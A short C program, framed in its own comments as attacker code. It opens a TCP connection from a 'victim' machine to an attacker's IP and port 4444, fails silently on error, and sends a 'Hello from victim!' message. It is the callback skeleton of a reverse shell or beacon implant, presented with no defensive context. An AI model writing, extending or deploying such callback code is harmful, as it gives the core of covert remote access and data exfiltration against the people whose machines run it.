#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>

int main() {
    int sockfd;
    struct sockaddr_in attacker;

    // Attacker's IP and port
    char *ip = "192.168.1.100";
    int port = 4444;

    // Create TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Setup attacker address
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(port);
    attacker.sin_addr.s_addr = inet_addr(ip);

    // Connect to attacker
    if (connect(sockfd, (struct sockaddr *)&attacker, sizeof(attacker)) < 0) {
        return 1;  // fail silently
    }

    // Send a simple message
    char msg[] = "Hello from victim!\n";
    send(sockfd, msg, strlen(msg), 0);

    // Close the connection
    close(sockfd);

    return 0;
}
